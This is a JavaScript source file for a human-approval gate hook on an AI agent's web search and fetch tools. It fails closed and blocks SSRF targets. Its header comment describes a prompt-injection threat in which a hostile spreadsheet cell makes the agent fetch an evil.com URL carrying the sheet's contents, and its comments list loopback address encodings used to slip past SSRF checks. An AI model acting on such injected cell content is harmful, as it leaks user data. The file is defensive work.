/**
 * The web-access gate — a Claude Code PreToolUse hook.
 *
 * The CLI runs this before every WebSearch/WebFetch call. It relays the request
 * to the daemon over loopback HTTPS; the daemon relays it to the sidebar over
 * the turn's SSE stream; the human clicks Allow or Skip; the answer flows back
 * and this process prints the allow/deny decision the CLI obeys.
 *
 * Verified live (2026-08-20, CLI 2.1.237): a deny blocks the tool and the
 * reason reaches Claude as the tool error; the hook can hold the call for many
 * seconds while a human decides; and — the fact that makes this file load-
 * bearing — an allowlisted tool with NO hook runs immediately, unprompted.
 * Headless print mode has no permission UI; this hook is the only gate.
 *
 * Why the gate matters here more than anywhere else: untrusted cell content
 * plus outbound network is an exfiltration channel. A hostile cell can ask for
 * a fetch of evil.com/?d=<the rest of the sheet>. The card in the sidebar
 * shows the full URL, query string included, so the human sees exactly what
 * would leave the machine.
 *
 * FAIL CLOSED. Every failure path — daemon unreachable, bad input, timeout,
 * unparseable response — denies. An error that silently allowed would turn
 * the security boundary into a suggestion.
 *
 * SSRF is auto-denied before a human is ever asked: the daemon itself listens
 * on 127.0.0.1 (pairing state, activity, paired-sheet list), and so do
 * routers, cloud metadata endpoints, and whatever else lives on the LAN.
 * "fetch https://127.0.0.1:8443/status" must die on arrival, not depend on
 * the user recognizing a loopback address under time pressure.
 *
 * Zero dependencies, like the rest of the daemon.
 */

'use strict';

const https = require('https');
const dns = require('dns');

/** Answer before the CLI's own hook timeout (300s in claude.js) can kill this
 * process mid-decision — a killed hook is indistinguishable from no hook, and
 * with the tools allowlisted that fails OPEN. The daemon's gate timeout (240s)
 * fits under this, and this fits under the CLI's. The isolation tests assert
 * the ordering. */
const SELF_TIMEOUT_MS = 270 * 1000;

// ---------------------------------------------------------------- SSRF check

/**
 * Parse a hostname as a legacy numeric IPv4 if it is one.
 *
 * inet_aton accepts far more than dotted quads: "2130706433", "0x7f000001",
 * "0177.0.0.1", and "127.1" are all 127.0.0.1 to the OS resolver. A checker
 * that only recognizes the dotted form waves the rest through.
 */
function numericV4_(host) {
  const parts = host.split('.');
  if (!parts.length || parts.length > 4) return null;
  const nums = [];
  for (const p of parts) {
    let n;
    if (/^0[xX][0-9a-fA-F]+$/.test(p)) n = parseInt(p, 16);
    else if (/^0[0-7]+$/.test(p)) n = parseInt(p, 8);
    else if (/^\d+$/.test(p)) n = parseInt(p, 10);
    else return null;
    if (!Number.isFinite(n) || n < 0) return null;
    nums.push(n);
  }
  // inet_aton: the last part fills the remaining bytes.
  const last = nums.pop();
  const maxLast = Math.pow(256, 4 - nums.length) - 1;
  if (nums.some((n) => n > 255) || last > maxLast) return null;
  let v = 0;
  for (const n of nums) v = v * 256 + n;
  v = v * Math.pow(256, 4 - nums.length) + last;
  return [(v >>> 24) & 255, (v >>> 16) & 255, (v >>> 8) & 255, v & 255];
}

function privateV4_(o) {
  return o[0] === 0 ||                                  // 0.0.0.0/8
         o[0] === 10 ||                                 // 10/8
         o[0] === 127 ||                                // loopback
         (o[0] === 100 && o[1] >= 64 && o[1] <= 127) || // CGNAT 100.64/10
         (o[0] === 169 && o[1] === 254) ||              // link-local
         (o[0] === 172 && o[1] >= 16 && o[1] <= 31) ||  // 172.16/12
         (o[0] === 192 && o[1] === 168) ||              // 192.168/16
         (o[0] === 192 && o[1] === 0 && o[2] === 0);    // 192.0.0/24
}

function privateV6_(host) {
  const h = host.toLowerCase();
  if (h === '::' || h === '::1') return true;
  if (/^f[cd]/.test(h)) return true;                    // fc00::/7 unique-local
  if (/^fe[89ab]/.test(h)) return true;                 // fe80::/10 link-local
  const mapped = /^::ffff:(\d+\.\d+\.\d+\.\d+)$/.exec(h);
  if (mapped) {
    const o = numericV4_(mapped[1]);
    return !o || privateV4_(o);
  }
  return false;
}

/** Is this hostname a private/loopback/link-local target on its face? */
function privateHost_(host) {
  const h = String(host || '').toLowerCase().replace(/\.$/, '');
  if (!h) return true;
  if (h === 'localhost' || h.endsWith('.localhost')) return true;
  if (h.endsWith('.local') || h.endsWith('.internal')) return true;   // mDNS / RFC 6762
  if (h.includes(':')) return privateV6_(h);
  const v4 = numericV4_(h);
  if (v4) return privateV4_(v4);
  return false;
}

/**
 * Full URL check for WebFetch. Scheme, literal host, and — for names — what
 * the name actually resolves to, because "public-looking hostname, private A
 * record" is the oldest SSRF trick there is. DNS-rebinding with a 0-TTL flip
 * between this check and the fetch remains possible; the gate card showing
 * the URL is the second line of defense, and this is documented as a residual.
 *
 * `resolve` is injectable for tests: (host, cb(err, addresses)).
 */
function checkUrl_(rawUrl, resolve, cb) {
  let u;
  try { u = new URL(String(rawUrl)); } catch {
    return cb({ ok: false, reason: 'not a valid URL' });
  }
  if (u.protocol !== 'https:' && u.protocol !== 'http:') {
    return cb({ ok: false, reason: 'only http(s) URLs may be fetched, not ' + u.protocol });
  }
  if (u.username || u.password) {
    return cb({ ok: false, reason: 'URLs with embedded credentials are not fetched' });
  }
  const host = u.hostname.replace(/^\[|\]$/g, '');
  if (privateHost_(host)) {
    return cb({ ok: false, reason: 'private or local address (' + host + ') — refused without asking' });
  }
  // A literal IP was already judged; a name must also resolve somewhere public.
  if (numericV4_(host) || host.includes(':')) return cb({ ok: true });
  resolve(host, (err, addresses) => {
    if (err || !addresses || !addresses.length) {
      return cb({ ok: false, reason: 'hostname did not resolve (' + host + ')' });
    }
    const bad = addresses.find((a) => privateHost_(typeof a === 'string' ? a : a.address));
    if (bad) {
      return cb({ ok: false, reason: 'hostname resolves to a private address — refused without asking' });
    }
    cb({ ok: true });
  });
}

// ------------------------------------------------------------------ decision

/**
 * Decide one hook invocation. Pure-ish and injectable so the whole matrix is
 * testable without a daemon, DNS, or the CLI:
 *   post(payload, cb({ok, allow, error}))  — the daemon hop
 *   resolve(host, cb)                      — DNS
 */
function decide_(input, deps, cb) {
  const tool = input && input.tool_name;
  const args = (input && input.tool_input) || {};

  const ask = (detail) => {
    deps.post({ tool: tool, detail: detail }, (res) => {
      if (!res || !res.ok) {
        return cb({ allow: false, reason: 'The local app could not confirm this request'
          + (res && res.error ? ' (' + res.error + ')' : '') + ' — refused.' });
      }
      if (!res.allow) {
        return cb({ allow: false, reason: res.timedOut
          ? 'The user did not answer the web-access request in time. Ask them to try again if it matters.'
          : 'The user chose not to allow this web request. Respect that decision.' });
      }
      cb({ allow: true, reason: 'Approved by the user in the sidebar.' });
    });
  };

  if (tool === 'WebSearch') {
    const query = String(args.query || '');
    if (!query) return cb({ allow: false, reason: 'empty search query' });
    return ask({ query: query });
  }

  if (tool === 'WebFetch') {
    const url = String(args.url || '');
    return checkUrl_(url, deps.resolve, (check) => {
      if (!check.ok) return cb({ allow: false, reason: 'Refused: ' + check.reason + '.' });
      ask({ url: url, prompt: args.prompt ? String(args.prompt) : undefined });
    });
  }

  // A tool this hook was never meant to judge: deny. The matcher should make
  // this unreachable; if it ever fires, failing closed is the only safe answer.
  cb({ allow: false, reason: 'unexpected tool for the web gate: ' + tool });
}

// -------------------------------------------------------------------- wiring

/* istanbul ignore next -- exercised live, not unit-tested */
function postToDaemon_(payload, cb) {
  const body = JSON.stringify({
    token: process.env.SHEETS_TURN_TOKEN || '',
    tool: payload.tool,
    detail: payload.detail,
  });
  const req = https.request({
    host: '127.0.0.1',
    port: Number(process.env.SHEETS_DAEMON_PORT || 8443),
    path: '/gate',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    // Self-signed loopback cert; the token authenticates, not the TLS identity.
    rejectUnauthorized: false,
  }, (res) => {
    let raw = '';
    res.on('data', (d) => { raw += d; });
    res.on('end', () => {
      try { cb(JSON.parse(raw)); } catch { cb({ ok: false, error: 'unparseable response' }); }
    });
  });
  req.on('error', (err) => cb({ ok: false, error: err.message }));
  req.end(body);
}

function emit_(allow, reason) {
  process.stdout.write(JSON.stringify({
    hookSpecificOutput: {
      hookEventName: 'PreToolUse',
      permissionDecision: allow ? 'allow' : 'deny',
      permissionDecisionReason: reason,
    },
  }));
}

/* istanbul ignore next */
function main() {
  // Whatever else happens, answer before the CLI's hook timeout: see above.
  const guard = setTimeout(() => {
    emit_(false, 'The web-access gate timed out — refused.');
    process.exit(0);
  }, SELF_TIMEOUT_MS);

  let raw = '';
  process.stdin.on('data', (d) => { raw += d; });
  process.stdin.on('end', () => {
    let input;
    try { input = JSON.parse(raw); } catch {
      clearTimeout(guard);
      emit_(false, 'unreadable hook input — refused');
      return process.exit(0);
    }
    decide_(input, {
      post: postToDaemon_,
      resolve: (host, cb) => dns.lookup(host, { all: true }, cb),
    }, (out) => {
      clearTimeout(guard);
      emit_(out.allow, out.reason);
      process.exit(0);
    });
  });
}

if (require.main === module) main();

module.exports = { decide_, checkUrl_, privateHost_, numericV4_, SELF_TIMEOUT_MS };
